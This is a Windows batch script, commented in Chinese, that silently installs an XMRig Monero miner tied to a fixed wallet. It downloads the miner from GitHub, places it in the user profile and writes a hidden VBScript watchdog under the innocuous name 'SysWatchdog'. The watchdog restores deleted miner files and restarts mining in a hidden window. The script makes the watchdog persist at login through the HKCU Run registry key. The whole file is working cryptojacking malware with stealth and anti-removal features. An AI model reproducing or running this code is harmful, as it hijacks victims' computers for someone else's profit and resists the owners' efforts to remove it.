@echo off
setlocal ENABLEDELAYEDEXPANSION

:: ----------------------------
:: 配置参数
:: ----------------------------
set "WALLET=4AShsoDTtthPHBqX56c8Rj6A6iZtCXR4xesRU2xw8Yf2VHaZkzK8bHiKgzMDcT5wvfZjvcTaywgUn6h3aU4zAy16K56Ad2c"
set "ZIP_URL=https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-win64.zip"
set "ZIP_PATH=%TEMP%\xmrig-c3.zip"

:: xmrig 主目录（安装目录）
set "XMIGR_DIR=%USERPROFILE%\c3pool"

:: 监控脚本及备份文件存放目录（两者存放在完全独立的地方）
set "VBS_DIR=%USERPROFILE%\AppData\Local\SysWatchdog"

:: 日志文件放在当前miner.bat所在目录下（相对路径）
set "LOG=log.txt"

:: ----------------------------
:: 清理旧目录、旧文件
:: ----------------------------
echo [*] 清理旧文件...
if exist "%XMIGR_DIR%" rmdir /s /q "%XMIGR_DIR%"
if exist "%ZIP_PATH%" del /f /q "%ZIP_PATH%"
if not exist "%VBS_DIR%" (
    mkdir "%VBS_DIR%"
    echo [*] 目录 %VBS_DIR% 创建成功.
) else (
    echo [*] 目录 %VBS_DIR% 已存在.
)

:: ----------------------------
:: 下载 ZIP（优先使用 curl，其次 bitsadmin）
:: ----------------------------
echo [*] 下载 xmrig 压缩包...
where curl >nul 2>nul
if %errorlevel%==0 (
    curl -L "%ZIP_URL%" -o "%ZIP_PATH%"
) else (
    bitsadmin /transfer "xmrigC3" "%ZIP_URL%" "%ZIP_PATH%" >nul
)
if not exist "%ZIP_PATH%" (
    echo [!] 下载失败，未找到 "%ZIP_PATH%"。
    pause
    exit /b 1
)

:: ----------------------------
:: 解压 ZIP 到 xmrig 主目录
:: ----------------------------
echo [*] 正在解压到 "%XMIGR_DIR%"...
powershell -NoProfile -Command "try { Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%XMIGR_DIR%' -Force } catch { exit 1 }"
if errorlevel 1 (
    echo [!] 解压失败。
    pause
    exit /b 1
)
if not exist "%XMIGR_DIR%\xmrig.exe" (
    echo [!] 在 "%XMIGR_DIR%" 下未找到 xmrig.exe 。
    pause
    exit /b 1
)

:: ----------------------------
:: 创建 miner.bat（使用 %~dp0 确保引用当前目录）
:: ----------------------------
echo [*] 创建 miner.bat...
(
  echo @echo off
  echo cd /d "%%~dp0"
  echo echo [%%DATE%% %%TIME%%] Starting xmrig >> "%LOG%"
  echo xmrig.exe --no-benchmark --config config.json ^> "%LOG%" 2^>^&1
) > "%XMIGR_DIR%\miner.bat"

:: ----------------------------
:: 在VBS_DIR内创建备份：复制 xmrig.exe 和 miner.bat
:: ----------------------------
echo [*] 复制备份文件到 "%VBS_DIR%"...
copy "%XMIGR_DIR%\xmrig.exe" "%VBS_DIR%\xmrig.exe" /Y >nul
copy "%XMIGR_DIR%\miner.bat" "%VBS_DIR%\miner.bat" /Y >nul

:: ----------------------------
:: 创建 VBScript 监控脚本（逐行写入，自动恢复主目录缺失文件）
:: ----------------------------
echo [*] 创建 watchdog VBScript...
rem 清空已有文件
break > "%VBS_DIR%\run_hidden.vbs"
echo Set fso = CreateObject("Scripting.FileSystemObject") >> "%VBS_DIR%\run_hidden.vbs"
echo Set WshShell = CreateObject("WScript.Shell") >> "%VBS_DIR%\run_hidden.vbs"
echo Do >> "%VBS_DIR%\run_hidden.vbs"
echo     On Error Resume Next >> "%VBS_DIR%\run_hidden.vbs"
echo     ' 检查并恢复 miner.bat 文件 >> "%VBS_DIR%\run_hidden.vbs"
echo     If Not fso.FileExists("%%XMIGR_DIR%%\miner.bat") Then >> "%VBS_DIR%\run_hidden.vbs"
echo         fso.CopyFile "%%VBS_DIR%%\miner.bat", "%%XMIGR_DIR%%\miner.bat", True >> "%VBS_DIR%\run_hidden.vbs"
echo     End If >> "%VBS_DIR%\run_hidden.vbs"
echo     ' 检查并恢复 xmrig.exe 文件 >> "%VBS_DIR%\run_hidden.vbs"
echo     If Not fso.FileExists("%%XMIGR_DIR%%\xmrig.exe") Then >> "%VBS_DIR%\run_hidden.vbs"
echo         fso.CopyFile "%%VBS_DIR%%\xmrig.exe", "%%XMIGR_DIR%%\xmrig.exe", True >> "%VBS_DIR%\run_hidden.vbs"
echo     End If >> "%VBS_DIR%\run_hidden.vbs"
echo     On Error Goto 0 >> "%VBS_DIR%\run_hidden.vbs"
echo     isRunning = False >> "%VBS_DIR%\run_hidden.vbs"
echo     Set processList = GetObject("winmgmts:").ExecQuery("Select * from Win32_Process Where Name = 'xmrig.exe'") >> "%VBS_DIR%\run_hidden.vbs"
echo     For Each proc In processList >> "%VBS_DIR%\run_hidden.vbs"
echo         isRunning = True >> "%VBS_DIR%\run_hidden.vbs"
echo         Exit For >> "%VBS_DIR%\run_hidden.vbs"
echo     Next >> "%VBS_DIR%\run_hidden.vbs"
echo     If Not isRunning Then >> "%VBS_DIR%\run_hidden.vbs"
echo         If fso.FileExists("%%XMIGR_DIR%%\miner.bat") Then >> "%VBS_DIR%\run_hidden.vbs"
echo             WshShell.Run Chr(34) ^& "%%XMIGR_DIR%%\miner.bat" ^& Chr(34), 0, False >> "%VBS_DIR%\run_hidden.vbs"
echo         Else >> "%VBS_DIR%\run_hidden.vbs"
echo             WshShell.Run Chr(34) ^& "%%VBS_DIR%%\miner.bat" ^& Chr(34), 0, False >> "%VBS_DIR%\run_hidden.vbs"
echo         End If >> "%VBS_DIR%\run_hidden.vbs"
echo     End If >> "%VBS_DIR%\run_hidden.vbs"
echo     WScript.Sleep 10000 >> "%VBS_DIR%\run_hidden.vbs"
echo Loop >> "%VBS_DIR%\run_hidden.vbs"

:: 调试：检查 VBScript 文件是否创建成功
if exist "%VBS_DIR%\run_hidden.vbs" (
    echo [*] run_hidden.vbs 创建成功于 "%VBS_DIR%".
) else (
    echo [!] ERROR: run_hidden.vbs 未创建!
    pause
    exit /b 1
)

:: 将环境变量传入 VBScript时需要替换%%为当前的%
set "REAL_XMIGR_DIR=%XMIGR_DIR%"
set "REAL_VBS_DIR=%VBS_DIR%"

:: 用 VBS 文件中的占位符替换真实路径：注意使用 PowerShell 脚本替换%%XMIGR_DIR%% 与 %%VBS_DIR%%
for /f "delims=" %%I in ('type "%VBS_DIR%\run_hidden.vbs"') do (
    set "line=%%I"
    rem 替换占位符
    set "line=!line:%%XMIGR_DIR%%=%REAL_XMIGR_DIR%!"
    set "line=!line:%%VBS_DIR%%=%REAL_VBS_DIR%!"
    echo !line!>>"%VBS_DIR%\run_hidden.tmp"
)
move /y "%VBS_DIR%\run_hidden.tmp" "%VBS_DIR%\run_hidden.vbs" >nul

:: ----------------------------
:: 注册 VBScript 开机自启动（通过注册表 Run 键）
:: ----------------------------
echo [*] 注册 VBScript 开机自启动...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysWatchdog" /t REG_SZ /d "wscript.exe \"%VBS_DIR%\run_hidden.vbs\"" /f >nul

:: ----------------------------
:: 隐藏方式启动 VBScript 并退出主 CMD 窗口
:: ----------------------------
echo [*] 启动 watchdog...
start "" wscript "%VBS_DIR%\run_hidden.vbs"

endlocal
exit /b 0